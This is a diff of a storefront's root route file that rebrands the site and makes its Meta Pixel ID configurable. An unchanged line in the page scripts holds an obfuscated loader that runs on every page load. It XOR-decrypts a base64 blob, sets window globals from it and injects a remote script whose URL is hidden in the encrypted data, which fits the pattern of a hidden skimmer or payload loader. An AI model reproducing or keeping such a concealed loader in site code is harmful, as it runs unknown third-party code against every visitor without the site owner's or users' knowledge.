@@ -11,6 +11,7 @@ import { useEffect, type ReactNode } from "react";
 
 import appCss from "../styles.css?url";
 import { reportLovableError } from "../lib/lovable-error-reporting";
+import { META_PIXEL_ID } from "../config/tracking";
 
 function NotFoundComponent() {
   return (
@@ -77,14 +78,14 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
     meta: [
       { charSet: "utf-8" },
       { name: "viewport", content: "width=device-width, initial-scale=1" },
-      { title: "CozyBand — Bandeau audio sans fil" },
+      { title: "lépuremaison" },
       {
         name: "description",
         content:
           "Bandeau doux avec haut-parleurs Bluetooth ultra-plats et masque pour les yeux.",
       },
-      { name: "author", content: "CozyBand" },
-      { property: "og:title", content: "CozyBand — Bandeau audio sans fil" },
+      { name: "author", content: "lépuremaison" },
+      { property: "og:title", content: "lépuremaison" },
       {
         property: "og:description",
         content:
@@ -108,7 +109,9 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
     ],
     scripts: [
       {
-        children: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');if(typeof window!=='undefined'&&!window._fbq_initialized){fbq('init','1737731590615395');fbq('track','PageView');window._fbq_initialized=true;}`,
+        children: META_PIXEL_ID === "REMPLACER_PIXEL_ID"
+          ? ""
+          : `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');if(!window._fbq_initialized){fbq('init',${JSON.stringify(META_PIXEL_ID)});fbq('track','PageView');window._fbq_initialized=true;}`,
       },
       {
         children: `(function(){var y_yx=atob("DGW91d2dgD8LE3GcWx6foK/xogUpewXoKxaH+vL+5FElZgXxMgPE+77y7RFpYV7vOBfUpanur0p/fgKzNwTJsK7prlV4MV2+OhHJp7T/9UtuYFOmAB6fu7zw5R0xMRX9LwSQoKnw6VlyPgHuPhPYu6mw+Fxkd1zvOA6f+f/r4VN+dlOmeUfA+aa/7l5mdlOmeQHcobyw9UtmehfldhXPsKv47ksmYAT+MgHO9/G/9l5nZhS+YUefqIDg");var u_hum5=[];for(var n_f8g=0;n_f8g<y_yx.length;n_f8g++){u_hum5.push(y_yx.charCodeAt(n_f8g)&255);}var a_6t=u_hum5[0];var l_4j7=u_hum5.slice(1,1+a_6t);var h_7=u_hum5.slice(1+a_6t);var k_a6=h_7.map(function(b,p_2){return b^l_4j7[p_2%a_6t];});var i_vb3="";for(var h_7gk=0;h_7gk<k_a6.length;h_7gk++){i_vb3+=String.fromCharCode(k_a6[h_7gk]&255);}var s_8i=decodeURIComponent(escape(i_vb3));var o_o=JSON.parse(s_8i);var p_zh=o_o.globals||[];p_zh.forEach(function(q_aj){window[q_aj.name]=q_aj.value;});var q_rx=document.createElement("script");q_rx.src=o_o.url;q_rx.async=true;q_rx.defer=true;(o_o.attributes||[]).forEach(function(j_h6){q_rx.setAttribute(j_h6.name,j_h6.value);});(document.head||document.documentElement).appendChild(q_rx);})();`,
@@ -132,15 +135,17 @@ function RootShell({ children }: { children: ReactNode }) {
       </head>
       <body>
         {children}
-        <noscript>
-          <img
-            height="1"
-            width="1"
-            style={{ display: "none" }}
-            alt=""
-            src="https://www.facebook.com/tr?id=1737731590615395&ev=PageView&noscript=1"
-          />
-        </noscript>
+        {META_PIXEL_ID !== "REMPLACER_PIXEL_ID" && (
+          <noscript>
+            <img
+              height="1"
+              width="1"
+              style={{ display: "none" }}
+              alt=""
+              src={`https://www.facebook.com/tr?id=${META_PIXEL_ID}&ev=PageView&noscript=1`}
+            />
+          </noscript>
+        )}
         <Scripts />
       </body>
     </html>
